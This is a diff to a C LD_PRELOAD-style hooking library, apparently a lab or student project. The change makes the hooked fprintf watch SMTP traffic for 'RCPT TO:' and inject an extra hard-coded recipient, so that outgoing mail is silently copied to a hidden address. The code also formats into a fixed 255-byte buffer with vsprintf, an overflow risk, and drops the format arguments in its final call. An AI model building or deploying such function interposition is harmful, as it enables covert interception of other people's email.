@@ -2,6 +2,7 @@
 #include <dlfcn.h>
 #include <stdio.h>
 #include <string.h>
+#include <stdarg.h>
 
 /* Function pointers to hold the value of the glibc functions */
 static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
@@ -56,25 +57,30 @@ ssize_t write(int fd, const void *buf, size_t count)
 
 int fprintf(FILE *stream, const char *format, ...)
 {
-    real_fprintf = dlsym(RTLD_NEXT, "fprintf");
-    printf("Hello world ! FPRINTF\n");
+    //Sep
+    char buffer[255];
+    va_list args;
 
-    char buf[] = "FALSE FOR NOW";
+    va_start(args, format);
+    vsprintf(buffer, format, args);
+    va_end(args);
+
+    real_fprintf = dlsym(RTLD_NEXT, "fprintf");
+    
     char RECEPT_TO[] = "RCPT TO:";
-    char *result = strstr(buf, RECEPT_TO);
+    char *result = strstr(buffer, RECEPT_TO);
 
     if (result != NULL)
     {
-        real_fprintf(stream, "Hello World sup\n");
+        real_fprintf(stream, "RCPT TO: malik.fleury@he-arc.ch\n");
         fflush(stream);
 
-        char buffer[255];
+        char receipt[255];
         do
         {
-            fgets(buffer, sizeof(buffer), stream);
-            printf(buffer);
+            fgets(receipt, sizeof(receipt), stream);
             //puts(buffer);
-        }while(buffer[0] < '2' || buffer[0] > '5');
+        } while (receipt[0] < '2' || receipt[0] > '5');
     }
 
     return real_fprintf(stream, format);
